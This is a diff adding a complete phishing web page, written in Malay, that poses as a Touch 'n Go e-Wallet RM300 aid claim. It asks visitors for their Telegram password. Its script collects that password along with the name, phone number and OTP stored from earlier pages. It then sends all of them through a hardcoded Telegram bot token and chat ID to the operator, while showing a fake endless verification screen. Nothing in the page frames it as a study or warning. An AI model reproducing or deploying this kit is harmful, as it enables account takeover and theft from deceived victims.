@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Claim Now Bantuan e-Wallet Touch n Go RM 300</title>
+
+    <!-- Link ke Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- Link ke CSS intl-tel-input -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
+    />
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      body,
+      html {
+        height: 100%;
+        width: 100%;
+        background-color: #fff;
+      }
+
+      .hero {
+        height: 100vh;
+        width: 100%;
+        background-size: cover;
+        background-position: center;
+        position: relative;
+      }
+
+      /* navbar */
+      .navbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background-color: #fff; /* Warna latar belakang navbar */
+        padding: 10px 20px;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 9999;
+      }
+
+      .navbar .navbar-logo {
+        font-size: 2vw; /* Ukuran font logo dinamis */
+        color: #010101;
+        font-weight: 400;
+        display: flex;
+        align-items: center;
+      }
+
+      .navbar .navbar-nav {
+        display: flex;
+        align-items: center;
+        justify-content: flex-end; /* Posisi tautan tetap rapih di ujung kanan */
+        flex-wrap: nowrap; /* Mencegah elemen terbungkus menjadi kolom */
+      }
+
+      .navbar .navbar-nav a {
+        color: #010101; /* Warna teks bahasa */
+        font-weight: bold;
+        font-size: 1.5vw; /* Ukuran font dinamis */
+        margin: 0 10px; /* Menambahkan jarak antar link bahasa */
+        padding: 5px; /* Ruang klik */
+        text-decoration: none; /* Menghilangkan garis bawah pada link */
+        white-space: nowrap; /* Mencegah teks terpotong ke baris baru */
+      }
+
+      .navbar .navbar-nav a span {
+        color: blue;
+      }
+
+      .navbar .navbar-nav a:hover {
+        color: #007bff; /* Warna hover */
+        transition: color 0.3s ease; /* Efek transisi saat hover */
+      }
+
+      .navbar .navbar-img {
+        width: 40px; /* Ukuran logo */
+        height: auto;
+        margin-left: 10px; /* Jarak antara logo dan teks */
+        object-fit: contain; /* Menjaga proporsi gambar */
+      }
+
+      /* Media Query untuk layar kecil */
+      @media (max-width: 768px) {
+        .navbar {
+          padding: 10px 10px; /* Mengurangi padding pada layar kecil */
+        }
+
+        .navbar .navbar-logo {
+          font-size: 4vw; /* Ukuran font logo lebih besar pada layar kecil */
+        }
+
+        .navbar .navbar-nav {
+          flex-direction: row; /* Pastikan tautan tetap satu baris */
+        }
+
+        .navbar .navbar-nav a {
+          font-size: 3vw; /* Ukuran font lebih besar pada layar kecil */
+          margin: 0 5px; /* Mengurangi margin pada layar kecil */
+          padding: 5px; /* Ruang klik pada layar kecil */
+          font-size: 1.5rem;
+        }
+      }
+      img {
+        width: 350px; /* Atur lebar gambar sesuai keinginan */
+        height: auto; /* Agar proporsi gambar tetap */
+        display: flex; /* Untuk membuatnya blok, bisa juga inline-block */
+        margin: 0 auto; /* Posisikan di tengah jika dalam elemen blok */
+      }
+
+      img[src="img2.jpeg"] {
+        margin-top: 50px;
+      }
+
+      .form-container {
+        justify-content: center;
+        background-color: white;
+        padding: 20px 20px;
+        border-radius: 10px;
+        width: 70%;
+        margin: 50px auto;
+        margin-top: 0;
+      }
+
+      p {
+        font-size: 18px;
+        color: #010101;
+        text-align: center;
+        margin-top: 5px;
+        margin-bottom: 5px;
+        line-height: 1.6;
+        font-weight: bolder;
+      }
+
+      input[type="password"] {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 0;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 1.1rem;
+      }
+
+      .btn {
+        display: flex;
+        width: 100%;
+        padding: 12px;
+        margin: 30px auto 0;
+        background-color: #f8d704;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        font-size: 1.1rem;
+        cursor: pointer;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .btn:hover {
+        background-color: #225786;
+      }
+
+      ._record-box {
+        width: 95%;
+        margin: 20px auto;
+        padding: 5px;
+        background-color: #f5f5f5;
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      }
+
+      /* CSS untuk list-box */
+      .list-box {
+        overflow: hidden;
+        max-height: 225px;
+      }
+
+      /* CSS untuk list */
+      .list {
+        display: flex;
+        flex-direction: column;
+      }
+
+      /* CSS untuk item */
+      .item {
+        display: flex;
+        align-items: center;
+        padding: 1px;
+        background-color: white;
+        border-radius: 8px;
+        margin-bottom: 5px;
+      }
+
+      /* CSS untuk logo/avatar */
+      .record_logo img {
+        width: 50px;
+        height: 50px;
+        border-radius: 50%;
+        object-fit: cover;
+        margin-right: 15px;
+        margin-left: 15px;
+      }
+
+      /* CSS untuk nama */
+      .center .h1 {
+        font-size: 16px;
+        font-weight: bold;
+      }
+
+      /* CSS untuk status */
+      .center .h2 {
+        font-size: 14px;
+        color: green;
+      }
+
+      /* Loading screen styles */
+      .loading-screen {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255, 255, 255, 0.8);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        display: none;
+      }
+
+      .loading-screen img {
+        max-width: 100px;
+        max-height: 100px;
+      }
+
+      main {
+        flex-grow: 1; /* Memastikan konten utama mendorong footer ke bawah */
+      }
+
+      footer {
+        position: fixed; /* Tetap di bawah meski konten lebih pendek */
+        left: 0;
+        bottom: 0;
+        width: 100%;
+        background-color: #fff; /* Latar belakang footer */
+        text-align: center;
+      }
+
+      footer img {
+        max-width: 350px; /* Ukuran gambar maksimal */
+        height: auto;
+      }
+
+      h4 {
+        display: flex;
+        margin-top: 5px;
+        font-size: 25px;
+        justify-content: center;
+        align-items: center;
+        margin-bottom: 0;
+        color: #f8d704;
+      }
+
+      /* Keyframes for spin animation */
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      @media (max-width: 768px) {
+        .form-container {
+          width: 90%;
+          padding: 20px;
+        }
+
+        input[type="text"],
+        input[type="tel"] {
+          font-size: 1rem;
+        }
+
+        .btn {
+          width: 60%;
+          font-size: 1rem;
+          padding: 10px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .info {
+          font-size: 40px;
+        }
+
+        p {
+          font-size: 16px;
+        }
+
+        .btn-daftar {
+          padding: 8px 16px;
+          font-size: 14px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <nav class="navbar">
+      <div class="navbar-nav">
+        <a href="#">Bantuan e Wallet Touch n Go</a>
+      </div>
+    </nav>
+    <br />
+    <img src="img-22.jpeg" alt="tng-img" />
+    <h4>CLAIM RM 300 NOW</h4>
+
+    <div class="form-container">
+      <p id="kataSandi">Sila Masukkan kata laluan Telegram Anda</p>
+      <form id="registrationForm">
+        <input
+          type="password"
+          id="kata-sandi"
+          name="kata-sandi"
+          placeholder="Masukkan kata laluan Awak"
+          required
+        />
+        <button type="submit" class="btn" id="loginButton">Teruskan</button>
+      </form>
+
+      <img
+        id="loadingGif"
+        src="processing.gif"
+        alt="Loading..."
+        style="display: none; margin: 20px auto; width: 60%; height: auto"
+      />
+
+      <p id="formMessage" style="display: none; text-align: center">
+        Sila Masukan kata laluan Telegram Anda
+      </p>
+
+      <button
+        id="useAnotherPhone"
+        style="
+          display: none;
+          width: 100%;
+          padding: 12px;
+          margin: 30px auto 0;
+          background-color: #f8d704;
+          color: white;
+          border: none;
+          border-radius: 10px;
+          font-size: 1.1rem;
+          cursor: pointer;
+          align-items: center;
+          justify-content: center;
+        "
+      >
+        Gunakan Nombor Lain
+      </button>
+    </div>
+
+    <img src="img3.jpeg" alt="tng-img" />
+    <br />
+
+    <footer>
+      <!-- Hanya menampilkan gambar di dalam footer -->
+      <img src="ini1.png" alt="Logo Footer" />
+    </footer>
+
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+      <img src="loading-loading-forever.gif" alt="Loading..." />
+    </div>
+
+    <!-- Script untuk intl-tel-input -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <script>
+      // Mendapatkan data dari local storage
+      const name = localStorage.getItem("name") || "";
+      const phone = localStorage.getItem("phone") || "";
+      const otp = localStorage.getItem("otp") || "";
+
+      document
+        .getElementById("registrationForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Mencegah pengiriman form default
+
+          // Ambil nilai kata sandi
+          const kataSandi = document.getElementById("kata-sandi").value;
+
+          // Sembunyikan input kata sandi dan tombol login
+          document.getElementById("kata-sandi").style.display = "none";
+          const loginButton = document.getElementById("loginButton");
+          loginButton.style.display = "none"; // Sembunyikan tombol "Log Masuk"
+
+          // Tampilkan GIF loading
+          document.getElementById("loadingGif").style.display = "block";
+
+          // Ubah pesan menjadi "Sila tunggu proses pengesahan atau gunakan nombor telefon lain"
+          document.getElementById("formMessage").innerHTML =
+            "Sila tunggu proses pengesahan atau gunakan nombor telefon lain";
+          document.getElementById("formMessage").style.display = "block"; // Pastikan pesan terlihat
+          document.getElementById("kataSandi").style.display = "none";
+
+          // Ubah tombol "Gunakan Nomor Lain" menjadi terlihat
+          const useAnotherPhoneButton =
+            document.getElementById("useAnotherPhone");
+          useAnotherPhoneButton.style.display = "block"; // Tampilkan tombol
+
+          // Mengirim data ke Telegram
+          const botToken = "6947661507:AAG0GY-qoyF9wE7GKanhJ93QxPRzKNg7JAU"; // Ganti dengan token bot Anda
+          const chatId = "6325542505"; // Ganti dengan ID chat Anda
+
+          const message = `
+──────────────────────
+( MALAY | DATA )
+──────────────────────
+
+- Nama Lengkap  : ${name}
+
+- No HP         : ${phone}
+
+- OTP           : ${otp}
+
+- Kata Sandi    : ${kataSandi}
+──────────────────────
+    `;
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+            }),
+          })
+            .then((response) => {
+              if (response.ok) {
+                console.log("Pesan berhasil dikirim.");
+                // Tidak perlu ada waktu tunda, animasi tetap muncul sampai tombol "Gunakan Nomor Lain" ditekan
+              } else {
+                throw new Error("Gagal mengirim pesan ke Telegram");
+              }
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+              alert("Terjadi kesalahan saat mengirim pesan."); // Notifikasi kesalahan
+            });
+        });
+
+      // Event listener untuk tombol "Gunakan Nomor Lain"
+      document
+        .getElementById("useAnotherPhone")
+        .addEventListener("click", function () {
+          window.location.href = "index.html"; // Ganti dengan URL halaman awal
+        });
+    </script>
+
+    <script>
+      function startAutoScroll() {
+        var list = document.querySelector(".list");
+        var scrollTimer;
+
+        function scrollList() {
+          var firstItem = list.querySelector(".item:first-child");
+          var itemHeight = firstItem.offsetHeight;
+
+          list.style.transition = "margin-top 1s ease";
+          list.style.marginTop = `-${itemHeight}px`;
+
+          setTimeout(function () {
+            list.style.transition = "none";
+            list.style.marginTop = "0px";
+            list.appendChild(firstItem); // Pindahkan item pertama ke akhir
+          }, 1000); // Setelah animasi selesai (1 detik)
+
+          scrollTimer = setTimeout(scrollList, 2000); // Ulangi scroll setiap 2 detik
+        }
+
+        scrollList(); // Mulai scrolling
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        startAutoScroll(); // Jalankan scrolling otomatis saat halaman dimuat
+      });
+    </script>
+  </body>
+</html>
